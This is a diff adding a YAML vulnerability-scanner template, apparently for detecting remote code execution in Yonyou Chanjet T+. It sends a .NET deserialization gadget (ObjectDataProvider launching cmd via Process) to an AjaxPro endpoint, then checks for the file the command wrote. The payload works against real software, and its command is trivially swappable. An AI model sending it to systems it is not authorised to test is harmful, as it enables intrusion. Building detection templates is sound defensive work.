@@ -1,0 +1,30 @@
+name: yongyou-chanjet-tplus-rce
+set:
+  r1: randomLowercase(6)
+rules:
+  - method: POST
+    path: "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
+    headers:
+      X-Ajaxpro-Method: GetStoreWarehouseByStore
+    body: |
+      {
+        "storeID":{
+          "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+          "MethodName":"Start",
+          "ObjectInstance":{
+            "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+              "StartInfo": {
+                "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                "FileName":"cmd", "Arguments":"/c 111 > {{r1}}.txt"
+              }
+          }
+        }
+      }
+    expression: |
+      response.status == 200 && response.body.bcontains(b'error')
+  - method: GET
+    path: "/tplus/{{r1}}.txt"
+    expression: |
+      response.status == 200
+detail:
+  author: fliggy
